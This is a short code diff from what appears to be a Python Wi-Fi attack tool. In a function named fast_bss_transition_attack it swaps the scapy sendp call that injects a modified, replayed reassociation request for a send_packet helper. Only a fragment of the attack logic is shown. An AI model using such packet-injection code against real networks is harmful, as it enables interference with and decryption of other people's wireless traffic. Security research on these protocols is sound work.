@@ -334,7 +334,7 @@ def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
                     # Create modified request with replay counter
                     modified_req = pkt.copy()
                     # Inject modified request
-                    sendp(modified_req, iface=interface, verbose=False)
+                    send_packet(modified_req, interface)
                     return True
                     
         return False
